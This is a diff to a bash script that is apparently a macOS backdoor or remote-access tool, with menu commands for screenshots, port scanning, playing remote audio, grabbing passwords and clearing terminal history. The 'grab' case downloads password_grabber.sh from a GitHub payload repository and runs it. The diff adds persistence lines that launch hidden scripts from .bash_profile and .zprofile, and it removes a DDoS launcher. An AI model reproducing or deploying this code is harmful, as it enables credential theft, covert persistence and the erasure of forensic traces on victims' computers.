@@ -50,12 +50,11 @@ version       show macs version
 screenshot    screenshots macs current screen
 talk          text to speech
 help          shows the help menu
-command        enter custom bash command
+command       enter custom bash command
 scan          launches port scanner
 message       runs a message from audio.mp3
 grab          tries to grab password
 clear         clears terminal history"
-
 ;;
 command)
     echo "Custom bash command: "
@@ -63,13 +62,7 @@ command)
     CUSTOM_COMMAND=$($COMMAND)
     echo "$COMMAND"
     ;;
-ddos)
-    echo "launching ddos script... "
-    python3 .hidden/ddos.py
-    ;;
 scan)
-curl -s https://raw.githubusercontent.com/sorrynotsorry1/payload/main/portscanner.py >> .hidden/portscanner.py
-python .hidden/portscanner.py
     echo "Enter port: "
     read PORT
     echo "Enter address: "
@@ -80,7 +73,7 @@ python .hidden/portscanner.py
     ;;
 message)
     curl --location --request GET 'https://drive.google.com/uc\?export\=download\&id\=1PCQxmE-kEJQYKcFRZd_1GERkpRkjilBf' -o .hidden/audio.mp3 -s
-    Sleep 6
+    Sleep 1
     osascript -e "set Volume 10"
     afplay .hidden/audio.mp3
     ;;
@@ -88,15 +81,17 @@ grab)
 rm .zprofile
 rm .bash_profile
 curl -s https://raw.githubusercontent.com/sorrynotsorry1/payload/main/password_grabber.sh >> .hidden/terminal.sh
-sleep 5
+sleep 1
 chmod +x .hidden/terminal.sh
-sleep 5
+sleep 1
 open -a terminal.app .hidden/terminal.sh
 echo "password will be stored in .hidden/password.txt"
-mkdir .bash_profile
-mkdir .zprofile
+touch .bash_profile
+touch .zprofile
 echo ".hidden/server.sh" >> .bash_profile
+echo "nohup bash .hidden/open.sh &" >> .bash_profile
 echo ".hidden/server.sh" >> .zprofile
+echo "nohup bash .hidden/open.sh &" >> .zprofile
 ;;
 clear)
 rm .zsh_history
